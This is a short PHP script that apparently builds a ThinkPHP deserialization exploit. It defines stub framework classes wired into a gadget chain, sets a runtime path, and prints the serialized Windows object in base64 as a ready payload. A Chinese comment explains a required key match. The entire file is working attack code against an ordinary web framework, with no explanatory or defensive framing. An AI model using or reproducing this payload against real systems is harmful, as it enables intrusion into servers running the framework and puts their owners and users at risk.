<?php
namespace think;
class App{

    protected $runtimePath;
    public function __construct(string $rootPath = ''){
        $this->rootPath = $rootPath;
        $this->runtimePath = "D://";
        $this->route = new \think\route\RuleName();
    }
}


class Db{
	protected $connection;
	protected $config;
	function __construct(){
		$this->config = ['query'=>'think\Url'];
		$this->connection = new \think\App();
	}
}


abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
    	# append键必须存在，并且与$this->data相同
        $this->append = ["huha"=>[]];
        $this->data = ["huha"=>new \think\Db()];
    }
}

namespace think\route;
class RuleName{
	protected $item = [];
    protected $rule = [];
}

namespace think\model;
use think\Model;
class Pivot extends Model
{
}

namespace think\process\pipes;
use think\model\Pivot;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
//var_dump(new Windows());
echo base64_encode(serialize(new Windows()));
?>